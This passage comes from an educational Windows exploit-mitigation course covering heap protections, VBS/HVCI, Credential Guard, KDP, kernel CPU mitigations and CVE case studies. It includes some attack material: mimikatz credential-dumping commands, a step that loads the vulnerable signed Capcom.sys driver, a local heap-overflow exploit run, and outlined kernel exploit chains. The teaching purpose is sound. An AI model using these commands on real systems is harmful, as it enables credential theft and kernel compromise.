python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected output:
#   Gap between notes: 80 bytes
#   [+] Function pointer corrupted to: 0x4141414141414141
#   [+] Heap overflow succeeded — NO protection detected!
#   [!] Server crashed (connection closed)

# 2. Test with mitigated build WITHOUT Page Heap (heap integrity checks only)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe"  /p /disable vuln_heap_server_mitigated.exe /full
.\bin\vuln_heap_server_mitigated.exe
python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected: Similar to #1, but may detect corruption on HeapFree
#   Gap: 80 bytes, overflow succeeds, crash on use or later heap operation

# 3. Test with Page Heap enabled (BEST protection)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe"  /p /enable vuln_heap_server_mitigated.exe /full
.\bin\vuln_heap_server_mitigated.exe
python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected output:
#   Gap between notes: 8192 bytes (full page separation!)
#   [!] Large gap detected — Page Heap likely enabled!
#   [!] Server crashed during write — Page Heap detected overflow!
#   [+] PAGE HEAP PROTECTION DETECTED THE OVERFLOW!
#   Server terminates IMMEDIATELY on out-of-bounds write
```

**Key observations:**

- **Normal heap**: 80-byte gap (64-byte allocation + 16-byte metadata)
- **Page Heap**: 8192-byte gap (full page separation with guard pages)
- **Without mitigations**: Overflow succeeds → crash at controlled address
- **With Page Heap**: Immediate detection on out-of-bounds write
- **With heap encoding**: May detect corruption on subsequent heap operations

**Protection effectiveness ranking:**

1. **Page Heap** (best): Immediate detection, prevents corruption entirely
2. **Heap integrity checks**: Detects corruption on HeapFree or validation
3. **No mitigations** (worst): Full exploitation possible

### Key Takeaways

1. **Heap overflows are NOT reliably detected** without Page Heap: the standard heap
   only checks metadata on free/realloc. If the overflow doesn't corrupt an encoded
   header, it goes undetected. Page Heap (`gflags /p /enable /full`) places guard
   pages after every allocation for immediate detection.
2. **UAF bugs are silent without AppVerifier**: freed memory often still contains valid
   data, so reads succeed and writes don't crash. AppVerifier fills freed memory with
   `0xF0F0F0F0` and places guard pages — making UAF instantly visible.
3. **Heap isolation prevents type-confusion UAF**: this is why browsers use PartitionAlloc.
   Even if you can trigger a UAF in one object type, you cannot reclaim that memory with
   a different type from a different heap partition.
4. **Encoded heap metadata** (XOR with per-heap key) prevents attackers from crafting
   fake heap headers. The key changes per process and per heap instance.
5. **Safe unlinking** validates forward/backward pointer consistency before removing a
   chunk from a free list. This blocks classic unlink-based write-what-where attacks.
6. **Segment Heap** (Windows 10+ default for modern apps) adds allocation order
   randomization and guard pages between segments — making heap spraying harder.
7. **MemGC** delays memory reuse until all live pointers are gone — but has 10-15%
   overhead and is primarily used in Edge/browser engines.
8. **ACG + CIG together** create a strong code execution prevention: ACG blocks dynamic
   code generation, CIG blocks unsigned DLL loading. Combined, an attacker cannot
   introduce new executable code into the process.
9. **Always use `fflush(stdout)` before operations that may crash** — otherwise printf
   output is lost in the crash dump.

### Discussion Questions

1. **How do encoded heap headers prevent exploitation?**

   > Each heap has a random encoding key (generated at heap creation). All metadata
   > fields are XORed with this key before writing and after reading. An attacker who
   > corrupts metadata must know the encoding key to craft valid fake headers. The key
   > is stored in the `_HEAP` structure but ASLR makes finding it non-trivial.

2. **Why doesn't Windows use full garbage collection?**

   > GC requires tracking ALL references to every allocation — impossible in C/C++
   > where pointers can be cast to integers, stored in unions, or derived from
   > arithmetic. MemGC approximates this for specific allocator contexts (like Edge's
   > DOM engine) but cannot work for arbitrary C code.

3. **What's the trade-off between MemGC security and performance?**

   > MemGC delays freeing -> higher memory usage (quarantined allocations stay alive).
   > Periodic scanning has 10-15% CPU overhead. The memory overhead can be significant
   > for long-running processes. This is acceptable for browser tabs (short-lived) but
   > not for database servers or OS kernels.

4. **Can heap randomization be defeated with information leaks?**
   > Yes. If an attacker can leak heap addresses (via format string, partial overread,
   > or timing side channel), they can calculate the relative positions of heap chunks
   > and target specific metadata. This is exactly what we demonstrated in Day 2
   > Technique 1: leaking stack cookies and code pointers via format strings. The same
   > principle applies to heap cookies and heap metadata encoding keys.

## Day 5: Virtualization-Based Security (VBS) and HVCI

- **Goal**: Understand hardware-assisted security through virtualization.
- **Activities**:
  - _Reading_:
    - [VBS Overview](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)
    - [HVCI Documentation](https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity)
  - _Online Resources_:
    - [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
  - _Tool Setup_:
    - Windows 11 Pro/Enterprise with VBS
    - Hyper-V enabled
  - _Exercise_:
    - Enable VBS and HVCI
    - Test kernel code integrity
    - Verify Credential Guard

### Virtualization-Based Security (VBS)

**What is VBS?**:

- Uses hardware virtualization (Hyper-V)
- Creates isolated "Secure World" (VSM - Virtual Secure Mode)
- Normal Windows runs in "Normal World"
- Secure World protected from Normal World

**Architecture**:

```text
┌────────────────────────────────────┐
│         Hardware (CPU)             │
├────────────────────────────────────┤
│    Hyper-V Hypervisor (Ring -1)    │
├─────────────────┬──────────────────┤
│  Normal World   │  Secure World    │
│   (VTL 0)       │    (VTL 1)       │
├─────────────────┼──────────────────┤
│ Windows Kernel  │ Secure Kernel    │
│ Applications    │ Secure Services  │
│ Drivers         │ - Credential     │
│                 │   Guard          │
│                 │ - HVCI           │
│                 │ - Device Guard   │
└─────────────────┴──────────────────┘

Normal World CANNOT access Secure World
Secure World CAN inspect Normal World
Hypervisor enforces isolation
```

**VBS Features**:

1. **Hypervisor-Protected Code Integrity (HVCI)**
   - Validates kernel code signatures
   - Prevents unsigned code execution in kernel

2. **Credential Guard**
   - Isolates credentials (NTLM, Kerberos tickets)
   - Prevents credential theft (mimikatz)

3. **Device Guard**
   - Application whitelisting
   - Only signed apps can run

4. **Kernel Data Protection (KDP)**
   - Protects kernel data structures
   - Read-only enforced by hypervisor

#### Checking VBS Status

**PowerShell**(admin):

```bash
# Check if VBS is capable
Get-ComputerInfo | Select-Object DeviceGuard*

# Check if VBS is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Output interpretation:
# SecurityServicesRunning is an ARRAY, not a single value:
#   Contains 1 = Credential Guard is running
#   Contains 2 = HVCI (Hypervisor-Enforced Code Integrity) is running
#   Contains 5 = SMM Firmware Measurement
#   Contains 7 = System Guard Secure Launch
#   e.g. {2, 5, 7} = HVCI + SMM + Secure Launch running

# VirtualizationBasedSecurityStatus values:
#   0 = Not enabled
#   1 = Enabled but not running
#   2 = Enabled and running

# DeviceGuardSmartStatus: Off
# Means: Full Device Guard policy not enforced (HVCI can run independently)

# Note: VBS requires nested virtualization support
# May be disabled in VirtualBox VMs or other virtualized environments
```

#### Microsoft Pluton (Hardware-based Security)

Modern Windows 11 devices (Ryzen 6000+, Intel 12th Gen+) may integrate the **Microsoft Pluton** security processor directly into the CPU die, replacing or augmenting the traditional TPM.

```bash
# Check TPM manufacturer (determines if Pluton is present)
Get-CimInstance -Namespace root/cimv2/security/microsofttpm -ClassName Win32_Tpm | Select-Object ManufacturerIdTxt

# Common ManufacturerIdTxt values:
#   "INTC" = Intel fTPM (firmware TPM, no Pluton)
#   "AMD"  = AMD fTPM (no Pluton)
#   "MSFT" = Microsoft Pluton (integrated security processor)
#   "IFX"  = Infineon (discrete TPM chip)
#   "STM"  = STMicroelectronics (discrete TPM chip)

# Advanced Pluton check (only works on Windows 11 22H2+ with Pluton hardware):
Get-ComputerInfo | Select-Object -ExpandProperty CsSecurityProcessorFeatures
# Note: This property only exists on Pluton-enabled systems
# Will error on systems without Pluton or older Windows versions

# Key Benefits of Pluton (when present):
# - Eliminates "Bus Interposer" attacks (listening to traffic between CPU and TPM chip)
# - Provides continuous firmware protection via Windows Update
# - Stores sensitive credentials (BitLocker keys, Windows Hello) inside the CPU package
# - Only available on: AMD Ryzen 6000+, Intel 12th Gen+ (select models), Qualcomm Snapdragon
```

### Hypervisor-Protected Code Integrity (HVCI)

**What is HVCI?**:

- Also called "Memory Integrity"
- Validates all kernel-mode code
- Code must be signed by Microsoft or WHQL
- Enforced by Secure Kernel (VTL 1)

**How HVCI Works**:

Without HVCI:

1. Driver loaded into kernel
2. Kernel sets pages executable
3. Driver code runs
4. Unsigned/malicious driver can run

With HVCI:

1. Driver loaded into kernel
2. Kernel requests executable pages
3. Secure Kernel validates signature
4. If invalid -> request denied
5. Driver cannot execute
6. Only signed drivers run

**HVCI Protection**:

Attack Scenario: Kernel exploit

Without HVCI:

1. Exploit kernel bug
2. Write shellcode to kernel memory
3. Mark pages executable
4. Jump to shellcode
   -> Attacker has kernel code execution

With HVCI:

1. Exploit kernel bug
2. Write shellcode to kernel memory
3. Try to mark pages executable
4. Secure Kernel denies (not signed)
   -> Shellcode cannot execute

**Checking HVCI Status**:

```bash
# CORRECT way to check if HVCI is running:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning

# SecurityServicesRunning interpretation:
#   Contains 2 = HVCI is RUNNING
#   Missing 2  = HVCI is NOT running

# MISLEADING check (ignore this):
Get-ComputerInfo | Select-Object DeviceGuardSmartStatus
# "Off" does NOT mean HVCI is off!
# "Off" means full Device Guard policy is not enforced
# HVCI can run independently without full Device Guard

# Alternative check via Settings UI:
# Windows Security -> Device Security -> Core Isolation -> Memory Integrity
# Should show "On" if HVCI is running
```

**Enabling HVCI** (if not already running):

```bash
# Method 1: Via Windows Settings (easiest)
# Settings -> Privacy & Security -> Windows Security -> Device Security
# -> Core Isolation Details -> Memory Integrity -> Turn On

# Method 2: Via Group Policy
# Computer Configuration -> Administrative Templates -> System -> Device Guard
# Turn On Virtualization Based Security
# Enable Platform Security Level: Secure Boot and DMA Protection
# Enable Virtualization Based Protection of Code Integrity: Enabled with UEFI lock

# Reboot required after any method
shutdown /r /t 0

# IMPORTANT: HVCI Requirements
# - Nested virtualization support (Hyper-V hypervisor)
# - SLAT support (EPT on Intel, RVI on AMD)
# - UEFI firmware (not legacy BIOS)
# - Secure Boot enabled
# - Compatible drivers (unsigned drivers will fail to load)
# - Will NOT work in VirtualBox VMs (no nested Hyper-V support)
# - Use bare metal, Hyper-V, or VMware with nested virtualization enabled
```

#### Real-World Lab: The "BYOVD" Scenario

HVCI blocks _unsigned_ drivers. But what about _signed_ drivers with vulnerabilities?

1. **Preparation**: Download `Capcom.sys` (a notoriously vulnerable, signed driver) or use a dummy file.
2. **Test**:

```bash
# Create service for unsigned driver
sc create BadDriver binPath=C:\Windows_Mitigations_Lab\bin\Unsigned.sys type=kernel
sc start BadDriver
# Result: BLOCKED by HVCI

# Create service for Signed Vulnerable Driver (e.g., Capcom)
sc create VulnSigned binPath=C:\Windows_Mitigations_Lab\bin\Capcom.sys type=kernel
sc start VulnSigned
# Result: ALLOWED by HVCI (Signature is valid!)
```

**Key Takeaway**: HVCI ensures code _integrity_, not code _quality_. Attackers bypass HVCI by bringing valid, signed drivers with known bugs to load into the kernel.

### Credential Guard

**What is Credential Guard?**:

- Isolates secrets in VTL 1
- Prevents credential theft attacks
- Defeats mimikatz and similar tools

**Protected Credentials**:

- NTLM password hashes
- Kerberos TGT tickets
- Domain credentials
- Credential Manager secrets

**Attack Without Credential Guard**:

```bash
# Attacker runs mimikatz on compromised machine
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Output:
# * Username: admin
# * NTLM: 5f4dcc3b5aa765d61d8327deb882cf99
# -> Attacker has password hash, can Pass-the-Hash
```

**Attack With Credential Guard**:

```bash
# Attacker runs mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Output:
# * Username: admin
# * NTLM: (null)  ← Credential Guard blocked access!
```

**Enabling Credential Guard**:

```powershell
# IMPORTANT: Credential Guard Requirements
# - Windows 11 Enterprise or Windows 11 Education
# - Windows 10 Enterprise or Windows 10 Education
# - Windows Server 2016+ (Datacenter/Standard)
# NOT available on Windows Pro or Home editions!

# Check your Windows edition:
Get-ComputerInfo | Select-Object WindowsProductName, WindowsEditionId

# Enable via Group Policy (Enterprise/Education only):
# Computer Configuration -> Administrative Templates -> System -> Device Guard
# -> Turn On Virtualization Based Security
# -> Credential Guard Configuration: Enabled with UEFI lock

# Enable via Registry (if supported edition):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 1 /f

# Reboot required
shutdown /r /t 0

# Verify after reboot:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
# Should include 1 (Credential Guard)
# If "1" is missing, check:
#   1. Windows edition (must be Enterprise/Education)
#   2. VBS is running (VirtualizationBasedSecurityStatus should be 2)
#   3. Event Viewer: Applications and Services Logs -> Microsoft -> Windows -> DeviceGuard
```

### Kernel Data Protection (KDP)

> [!IMPORTANT]
> **KDP is opt-in, not automatic.** Drivers must explicitly call
> `MmProtectDriverSection()` to register data for hypervisor protection.
> Critical structures like `EPROCESS.Token` are NOT KDP-protected by default.

**What is KDP?**:

- Protects specific kernel data structures from modification
- Enforced by hypervisor (VTL 1)
- Drivers must **opt in** by calling `MmProtectDriverSection()`
- Not a blanket protection — only data explicitly registered is guarded

**How KDP Works**:

KDP is NOT automatic for all kernel structures. Drivers register specific
data sections as read-only, and the hypervisor enforces immutability.

```c
// Driver opts into KDP protection:
NTSTATUS DriverEntry(...) {
    // Mark a section as hypervisor-protected read-only
    MmProtectDriverSection(SectionHandle, /* ... */);
    // Now: any write to this section from VTL 0 -> bugcheck
}
```

**What KDP Protects** (when opted in):

- Driver-specific configuration data
- Security policy structures
- Function pointer tables (driver dispatch routines)
- Any data a driver explicitly registers

**What KDP Does NOT Protect**:

- EPROCESS.Token (this is NOT KDP-protected by default)
- Arbitrary kernel heap allocations
- Data that hasn't been explicitly registered
- Process/thread structures (unless a driver registers them)

> [!WARNING]
> A common misconception is that KDP protects `EPROCESS.Token` from
> token-swapping attacks. It does NOT — unless a specific driver opts in.
> Real-world kernel exploits (CVE-2024-21338, CVE-2023-28252) successfully
> overwrite tokens because EPROCESS is not KDP-protected. The actual
> defense against token swapping requires broader VBS features like
> Secure Kernel address space isolation.

**KDP in Action**:

Attack: Privilege escalation via token swap

1. Attacker has kernel r/w primitive
2. Find SYSTEM process EPROCESS
3. Copy SYSTEM token to attacker process
4. Without VBS: Success, attacker is SYSTEM
5. With VBS (but without KDP on tokens): Still succeeds!
6. With KDP on the specific structure: Hypervisor blocks write -> BSOD

### VBS Attack Surface Analysis

**What VBS Protects Against**:

- Kernel-mode code injection
- Credential theft from LSASS
- Unsigned driver loading
- Direct kernel object manipulation

**What VBS Does NOT Protect Against**:

- Hypervisor vulnerabilities (Hyper-V bugs)
- Hardware attacks (DMA, cold boot)
- Signed malicious drivers (supply chain)
- Data-only attacks in kernel
- User-mode exploitation
- Firmware/UEFI attacks

**Notable VBS/HVCI Bypasses**:

**CVE-2022-21894** (Secure Boot Bypass):

- BlackLotus UEFI bootkit
- Bypassed Secure Boot to disable VBS
- Required physical access or admin rights
- Patched but demonstrates VBS isn't invincible

### CVE Case Studies

Real-world examples of mitigation bypasses and failures:

#### CVE-2024-21338: Windows Kernel Elevation of Privilege

**Date**: February 2024
**Impact**: Local privilege escalation to SYSTEM
**Mitigations Present but Ineffective**: HVCI, VBS

**Technical Details**:

```text
Vulnerability: Logic bug in appid.sys (AppLocker driver)
Exploit Chain:
1. Create malicious ALPC port
2. Trigger vulnerable IOCTL in appid.sys
3. Achieve arbitrary kernel read/write
4. Overwrite process token (NOT protected by KDP — Token is not opted in)
5. Escalate to SYSTEM

Key Insight: Logic bugs bypass memory corruption mitigations
HVCI doesn't help because no unsigned code execution needed
KDP doesn't help because EPROCESS.Token is not KDP-registered
This is a DATA-ONLY attack — same category proven effective in Day 2
```

**Lesson**: HVCI protects code integrity, not data integrity. KDP only protects data that drivers explicitly register. Logic bugs and data-only attacks remain the primary kernel exploitation technique.

#### CVE-2024-30088: Windows Kernel TOCTOU (Authz)

**Date**: June 2024
**Impact**: Local privilege escalation
**Mitigations Challenged**: KASLR, SMEP, CFG

**Technical Details**:

```text
Vulnerability: Race condition in AuthzBasepCopyoutInternalSecurityAttributes
Exploit Technique:
1. Create a large set of security attributes
2. Trigger the copy operation in the kernel
3. Rapidly change the attribute size in a separate thread (TOCTOU)
4. Causes an out-of-bounds copy into the kernel heap
5. Gain arbitrary kernel read/write primitive via heap corruption

Mitigations Present:
- KASLR: Required info leak to find kernel base
- CFG: Challenged but bypassable via data-only primitives
- SMEP: Not relevant (no user-mode code execution)
```

**Lesson**: Race conditions (TOCTOU) remain one of the most reliable ways to bypass static checks in the kernel.

#### CVE-2023-36802: Microsoft Streaming Service Proxy EoP

**Date**: September 2023 (Exploited in the wild)
**Impact**: SYSTEM privileges from any user
**Attack Vector**: Used by commercial spyware

**Technical Details**:

```text
Vulnerability: Type confusion in mskssrv.sys

Exploit:
1. Open handle to vulnerable device
2. Send crafted IOCTL causing type confusion
3. Confused object allows arbitrary memory access
4. Overwrite security token
5. Spawn SYSTEM shell

Notable: Exploited before patch available (0-day)
Used in targeted attacks against specific individuals
```

**Lesson**: Driver attack surface remains large; 0-days actively exploited.

#### CVE-2023-28252: Windows CLFS Driver EoP

**Date**: April 2023 (Exploited by Nokoyawa ransomware)
**Impact**: SYSTEM from any user
**Mitigations Status**: All standard mitigations enabled

**Technical Details**:

```text
Vulnerability: Out-of-bounds write in CLFS.sys

Exploit Path:
1. Create malicious CLFS log file
2. Trigger parsing vulnerability
3. Corrupt kernel pool metadata
4. Achieve write-what-where primitive
5. Overwrite process token

Ransomware Usage:
- Nokoyawa used this to escalate privileges
- Combined with other techniques for full compromise
- Demonstrates real-world impact of kernel bugs
```

**Lesson**: Ransomware groups actively exploit kernel vulnerabilities.

#### CVE-2023-21768: Windows Ancillary Function Driver (AFD) EoP

**Date**: January 2023
**Impact**: SYSTEM privileges
**Interesting Aspect**: CFG bypass technique

**Technical Details**:

```text
Vulnerability: Memory corruption in afd.sys

CFG Bypass Technique Used:
1. Corrupt function pointer to point to valid CFG target
2. Use VirtualProtect (valid target) to make shellcode executable
3. Chain: corrupt ptr -> VirtualProtect -> shellcode

This demonstrates:
- CFG doesn't stop corruption, only validates targets
- VirtualProtect is a useful target for attackers
- ACG would have prevented this specific bypass
```

**Lesson**: CFG's granularity allows certain bypass patterns.

### Mitigation Effectiveness Timeline

How mitigations have evolved against real attacks:

```
2004: DEP introduced (XP SP2)
      ↓ Attackers develop ROP

2007: ASLR introduced (Vista)
      ↓ Attackers use info leaks

2015: CFG introduced (Win 8.1 Update 3)
      ↓ Attackers abuse valid targets

2018: CET announced (Hardware support later)
      ↓ Attackers pivot to data-only attacks

2020: VBS/HVCI mainstream (Win 10 2004)
      ↓ Attackers focus on logic bugs, signed drivers

2023-2024: Most in-the-wild exploits are:
      - Logic bugs (not memory corruption)
      - Signed driver abuse
      - Data-only attacks
      - Browser renderer escapes + kernel bugs
```

#### What Attackers Target Now

With comprehensive mitigations, attackers focus on:

**1. Logic Bugs**:

- No memory corruption needed
- Mitigations don't apply
- Examples: Permission checks, race conditions

**2. Signed Driver Abuse**:

- BYOVD (Bring Your Own Vulnerable Driver)
- Legitimate but vulnerable drivers
- HVCI allows signed code

**3. Supply Chain**:

- Compromise build process
- Backdoor signed updates
- Trusted code becomes malicious

**4. Browser + Kernel Chains**:

- Renderer escape (V8, WebKit bug)
- Sandbox escape
- Kernel privilege escalation
- Multiple bugs chained together

**5. Physical/Firmware Attacks**:

- DMA attacks
- UEFI implants
- Evil Maid scenarios

#### Kernel-Level CPU Mitigations

Beyond VBS/HVCI, modern Windows employs several CPU-level mitigations to protect the kernel.

##### SMEP (Supervisor Mode Execution Prevention)

**What is SMEP?**:

- CPU feature preventing kernel from executing user-mode pages
- Defeats classic kernel exploitation technique
- Available since Intel Ivy Bridge (2012) / Haswell (2013), AMD Bulldozer
- Enabled by default on Windows 8+

**The Attack SMEP Prevents**:

```text
Classic Kernel Exploit (Pre-SMEP):
---------------------------------------------------------------

1. Attacker allocates shellcode in user mode (Ring 3)
2. Triggers kernel vulnerability
3. Overwrites kernel function pointer -> user mode shellcode
4. Kernel (Ring 0) executes attacker's user mode code
5. Shellcode runs with kernel privileges!

User Mode                    Kernel Mode
┌─────────────────┐         ┌─────────────────┐
│ Shellcode       │◄────────│ Corrupted ptr   │
│ at 0x41410000   │  JUMP   │ -> 0x41410000   │
│ (Ring 3 memory) │         │                 │
└─────────────────┘         └─────────────────┘
     ▲
     │
   SMEP BLOCKS THIS!
```

**With SMEP Enabled**:

1. Attacker corrupts kernel pointer -> user mode address
2. Kernel tries to execute user mode page
3. CPU checks: "Am I in Ring 0 executing Ring 3 page?"
4. SMEP: YES -> #PF (Page Fault) -> BSOD
5. Attack fails, system crashes (DoS, not code execution)

**Checking SMEP Status**:

```bash
# Check CPU support
Get-CimInstance Win32_Processor | Select-Object Name
# Most CPUs since 2012 support SMEP

# Check if enabled (via CR4 register bit 20)
# In kernel debugger:
windbg -k net:port=50000,key=1.2.3.4

r cr4
# If bit 20 (0x100000) is set -> SMEP enabled

# Or use !cpuinfo
!cpuinfo
# Look for SMEP in features
```

**WinDbg Lab: Observing SMEP**:

```bash
# In kernel debugger:

# 1. Check CR4 register
r cr4
# Example: cr4=00000000001506f8
# Binary: ...0001 0101 0000 0110 1111 1000
#              ↑
#            Bit 20 = SMEP

# 2. Manually check bit
.formats cr4
? cr4 & 0x100000
# Non-zero = SMEP enabled

# 3. What happens with SMEP violation:
# BugCheck: KERNEL_MODE_EXCEPTION_NOT_HANDLED
# Or: PAGE_FAULT_IN_NONPAGED_AREA
```

##### SMAP (Supervisor Mode Access Prevention)

**What is SMAP?**:

- Prevents kernel from **reading/writing** user mode pages
- Complements SMEP (which only blocks execute)
- Available since Intel Broadwell (2014), AMD Zen
- Windows 10 1809+ enables by default

**The Attack SMAP Prevents**:

```text
Kernel Data Attack (Pre-SMAP):
-------------------------------------------------------------

Scenario: Kernel reads data from user-controlled pointer

void kernel_function(void *user_ptr) {
    // Kernel reads from user-supplied address
    struct config *cfg = (struct config *)user_ptr;
    if (cfg->admin_flag) {  // Attacker controls this memory!
        grant_admin();
    }
}

Attack:
1. Attacker sets up fake struct at user mode address
2. Attacker->admin_flag = 1
3. Kernel reads fake data, grants admin

With SMAP:
- Kernel cannot read user memory directly
- Must use copy_from_user() or probe functions
- Direct access causes #PF -> BSOD
```

**STAC/CLAC Instructions**:

```asm
; SMAP can be temporarily disabled for legitimate kernel operations
; Using STAC (Set AC flag) and CLAC (Clear AC flag)

; Kernel needs to copy from user mode:
stac                    ; Temporarily allow user access
mov rax, [user_ptr]     ; Now works
clac                    ; Re-enable SMAP protection
```

**Checking SMAP Status**:

```bash
# CR4 bit 21 = SMAP
r cr4
? cr4 & 0x200000
# Non-zero = SMAP enabled

# Or check EFLAGS AC bit during suspicious access
r efl
# AC flag (bit 18) set = SMAP temporarily disabled
```

##### KPTI / KVA Shadow (Meltdown Mitigation)

**What is KPTI?**:

- Kernel Page Table Isolation (Linux term)
- Windows calls it "KVA Shadow" (Kernel Virtual Address Shadow)
- Mitigates Meltdown vulnerability (CVE-2017-5754)
- Separates user and kernel page tables

**The Meltdown Attack**:

```text
Meltdown (CVE-2017-5754):
--------------------------------------------------------------

CPU Vulnerability: Speculative execution reads kernel memory

1. User mode code speculatively accesses kernel address
2. CPU eventually raises exception (access denied)
3. BUT: Before exception, data was loaded into cache
4. Side-channel attack reads data from cache
5. User mode leaks kernel memory!

Simplified:
a) char *kernel_addr = 0xFFFFF800...;  // Kernel address
b) char data = *kernel_addr;            // Speculative load
c) char probe = array[data * 4096];     // Encode in cache
d) Measure which array page is cached   // Leak 'data'
```

**How KVA Shadow Works**:

```text
Without KVA Shadow:
---------------------------------------------------------------------

Single Page Table for process:
┌─────────────────────────────────────────┐
│ User Space Mappings                     │  ← User code can access
├─────────────────────────────────────────┤
│ Kernel Space Mappings                   │  ← Visible but protected
│ (ntoskrnl, drivers, kernel data)        │     (Meltdown leaks this!)
└─────────────────────────────────────────┘


With KVA Shadow:
---------------------------------------------------------------------

User Mode (CR3 -> Shadow Table):    Kernel Mode (CR3 -> Full Table):
┌────────────────────────────┐    ┌─────────────────────────────────┐
│ User Space Mappings        │    │ User Space Mappings             │
├────────────────────────────┤    ├─────────────────────────────────┤
│ Minimal Kernel (trampoline)│    │ Full Kernel Mappings            │
│ Only entry/exit code       │    │ All drivers, data, etc.         │
└────────────────────────────┘    └─────────────────────────────────┘

On syscall: Switch CR3 to full table
On return:  Switch CR3 to shadow table
```

**Checking KVA Shadow Status**:

```bash
# PowerShell - Check Meltdown mitigation
Get-SpeculationControlSettings

# Look for:
# KVAShadowRequired: True/False
# KVAShadowWindowsSupportEnabled: True
# KVAShadowPcidEnabled: True (performance optimization)

# Registry check
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name FeatureSettingsOverride*
```

**Performance Impact**:

```text
KVA Shadow Performance Overhead:
-----------------------------------------------------------
Without PCID:    15-30% slowdown (syscall heavy workloads)
With PCID:       2-5% slowdown
PCID = Process Context Identifiers (TLB optimization)

Most modern CPUs support PCID, minimizing impact.
I/O intensive workloads affected more than compute.
```

##### Retpoline (Spectre v2 Mitigation)

**What is Retpoline?**:

- "Return Trampoline" - software mitigation for Spectre v2
- Replaces indirect branches with return-based sequences
- Prevents speculative execution of attacker-chosen targets

**The Spectre v2 Attack**:

1. Attacker trains branch predictor with malicious target
2. Victim executes indirect branch (jmp [rax])
3. CPU speculates to attacker-trained address
4. Speculative execution accesses secret data
5. Side-channel leaks the data

**How Retpoline Works**:

```asm
; Original vulnerable code:
jmp [rax]           ; Indirect jump - branch predictor vulnerable

; Retpoline replacement (simplified / conceptual):
call retpoline_rax  ; Use call/ret instead

retpoline_rax:
    lea rsp, [rsp-8]      ; Make room on stack
    mov [rsp], rax        ; Store target
    call .setup           ; Push return address
.loop:
    pause                 ; Spin (never actually executes)
    jmp .loop
.setup:
    mov [rsp+8], rax      ; Set up return target
    ret                   ; Return to target (not predicted)

; NOTE: Real retpoline implementations (e.g., Google's, Linux kernel)
; use `lfence` and different stack manipulation. This is a simplified
; illustration of the core concept.

; Why it works:
; - Returns are predicted differently than jumps
; - Speculation goes to .loop (harmless)
; - Actual execution goes to correct target
```

**Checking Retpoline/Spectre Status**:

```bash
# PowerShell - Full speculation control check
Get-SpeculationControlSettings

# Important fields:
# BTIHardwarePresent: CPU has hardware fix (IBRS/IBPB)
# BTIWindowsSupportEnabled: Windows mitigation active
# BTIWindowsSupportPresent: Windows supports mitigation
# BTIDisabledBySystemPolicy: Admin disabled it

# For servers with many syscalls, consider:
# - Hardware mitigations (newer CPUs)
# - Performance vs security tradeoff
```

**Speculation Control Settings Script**:

```bash
# Comprehensive speculation control audit
function Get-FullSpeculationStatus {
    $settings = Get-SpeculationControlSettings

    Write-Host "=== Meltdown (KVA Shadow) ===" -ForegroundColor Cyan
    Write-Host "Required: $($settings.KVAShadowRequired)"
    Write-Host "Enabled:  $($settings.KVAShadowWindowsSupportEnabled)"
    Write-Host "PCID:     $($settings.KVAShadowPcidEnabled)"

    Write-Host "`n=== Spectre v1 ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.SSBDHardwarePresent)"

    Write-Host "`n=== Spectre v2 (BTI) ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.BTIHardwarePresent)"
    Write-Host "Enabled:  $($settings.BTIWindowsSupportEnabled)"

    Write-Host "`n=== L1TF ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.L1TFHardwarePresent)"
    Write-Host "Enabled:  $($settings.L1TFWindowsSupportEnabled)"

    Write-Host "`n=== MDS ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.MDSHardwarePresent)"
    Write-Host "Enabled:  $($settings.MDSWindowsSupportEnabled)"
}

Get-FullSpeculationStatus
```

##### Kernel CFG (kCFG)

**What is Kernel CFG?**:

- CFG protection extended to kernel mode
- Validates indirect calls in kernel code
- Part of HVCI enforcement

**kCFG Architecture**:

```text
User Mode CFG:         Kernel Mode CFG (kCFG):
┌──────────────────┐  ┌──────────────────────────┐
│ Process bitmap   │  │ System-wide bitmap       │
│ Per-process      │  │ Loaded at boot           │
│ User DLLs only   │  │ All drivers validated    │
│ Software check   │  │ HVCI enforced            │
└──────────────────┘  └──────────────────────────┘
```

**Checking kCFG Status**:

```bash
# In kernel debugger:
!analyze -show CFG

# Check if driver is kCFG enabled:
!dh <driver_base> -f
# Look for IMAGE_GUARD_CF_INSTRUMENTED
```

#### Smart App Control (Windows 11 22H2+)

**What is Smart App Control?**:

- AI-powered application reputation system
- Blocks untrusted/unknown applications
- Only available on clean Windows 11 installs
- Cannot be re-enabled once disabled

**How It Works**:

1. App attempts to run
2. Microsoft cloud checks reputation
3. Known good -> Allow
4. Known bad -> Block
5. Unknown -> Block (in Enforcement mode)

**Modes**:

- **Evaluation**: Learning mode, monitors but doesn't block
- **Enforcement**: Actively blocks untrusted apps
- **Off**: Disabled (cannot re-enable)

**Checking Status**:

```bash
# Via Windows Security app
# Or registry:
